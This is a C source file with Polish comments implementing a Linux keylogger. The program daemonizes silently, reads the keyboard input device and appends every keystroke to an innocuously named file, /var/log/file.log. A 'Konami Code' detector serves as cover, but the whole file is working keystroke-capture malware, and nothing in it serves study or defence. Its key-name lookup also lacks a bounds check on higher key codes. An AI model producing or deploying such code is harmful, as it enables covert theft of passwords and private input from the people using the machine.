#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <string.h>

// Ścieżka do pliku logu
#define LOG_FILE "/var/log/file.log"

// Ścieżka do urządzenia klawiatury (sprawdź właściwe urządzenie)
#define KEYBOARD_DEVICE "/dev/input/event2"

// Maksymalna długość historii klawiszy
#define HISTORY_LENGTH 10

// Sekwencja Konami Code
const int konami_code[] = {KEY_UP, KEY_UP, KEY_DOWN, KEY_DOWN, KEY_LEFT,
                           KEY_RIGHT, KEY_LEFT, KEY_RIGHT, KEY_B, KEY_A};
const int konami_code_length = sizeof(konami_code) / sizeof(konami_code[0]);

// Historia wprowadzanych klawiszy
int key_history[HISTORY_LENGTH];
int history_index = 0;

// Mapa kodów klawiszy na nazwy
const char *key_names[] = {
    [KEY_ESC] = "ESC", [KEY_1] = "1", [KEY_2] = "2", [KEY_3] = "3",
    [KEY_4] = "4", [KEY_5] = "5", [KEY_6] = "6", [KEY_7] = "7",
    [KEY_8] = "8", [KEY_9] = "9", [KEY_0] = "0", [KEY_Q] = "Q",
    [KEY_W] = "W", [KEY_E] = "E", [KEY_R] = "R", [KEY_T] = "T",
    [KEY_Y] = "Y", [KEY_U] = "U", [KEY_I] = "I", [KEY_O] = "O",
    [KEY_P] = "P", [KEY_A] = "A", [KEY_S] = "S", [KEY_D] = "D",
    [KEY_F] = "F", [KEY_G] = "G", [KEY_H] = "H", [KEY_J] = "J",
    [KEY_K] = "K", [KEY_L] = "L", [KEY_Z] = "Z", [KEY_X] = "X",
    [KEY_C] = "C", [KEY_V] = "V", [KEY_B] = "B", [KEY_N] = "N",
    [KEY_M] = "M", [KEY_UP] = "UP", [KEY_DOWN] = "DOWN",
    [KEY_LEFT] = "LEFT", [KEY_RIGHT] = "RIGHT", [KEY_ENTER] = "ENTER",
    [KEY_SPACE] = "SPACE", [KEY_BACKSPACE] = "BACKSPACE"};

// Funkcja zapisująca wciśnięte klawisze do pliku logu
void log_key(const char *key) {
    FILE *file = fopen(LOG_FILE, "a");
    if (file == NULL) {
        return; // Nie można otworzyć pliku logu
    }
    fprintf(file, "%s\n", key);
    fclose(file);
}

// Funkcja przejścia programu w tryb demona
void daemonize() {
    pid_t pid = fork();
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }
    if (pid > 0) {
        exit(EXIT_SUCCESS); // Zamyka proces rodzica
    }
    if (setsid() < 0) {
        exit(EXIT_FAILURE);
    }
    // Zamknięcie deskryptorów standardowego wejścia/wyjścia
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
}

// Funkcja sprawdzająca Konami Code
void check_konami_code() {
    for (int i = 0; i < konami_code_length; i++) {
        int index = (history_index + i) % HISTORY_LENGTH;
        if (key_history[index] != konami_code[i]) {
            return; // Nie pasuje do Konami Code
        }
    }
    // Jeśli Konami Code zostało wpisane
    log_key("KONAMI CODE DETECTED!");
}

int main() {
    struct input_event ev;
    int fd;

    // Przejście w tryb demona
    daemonize();

    // Otwieranie urządzenia klawiatury
    fd = open(KEYBOARD_DEVICE, O_RDONLY);
    if (fd == -1) {
        log_key("Nie można otworzyć urządzenia klawiatury.");
        exit(EXIT_FAILURE);
    }

    // Inicjalizacja historii klawiszy
    memset(key_history, 0, sizeof(key_history));

    // Pętla nasłuchiwania zdarzeń klawiatury
    while (1) {
        if (read(fd, &ev, sizeof(struct input_event)) == sizeof(struct input_event)) {
            if (ev.type == EV_KEY && ev.value == 1) { // Naciśnięcie klawisza
                key_history[history_index] = ev.code;
                history_index = (history_index + 1) % HISTORY_LENGTH;

                const char *key_name = key_names[ev.code];
                if (key_name) {
                    log_key(key_name);
                } else {
                    char buf[32];
                    snprintf(buf, sizeof(buf), "UNKNOWN_KEY_%d", ev.code);
                    log_key(buf);
                }

                // Sprawdzanie Konami Code
                check_konami_code();
            }
        }
    }
    close(fd);
    return 0;
}
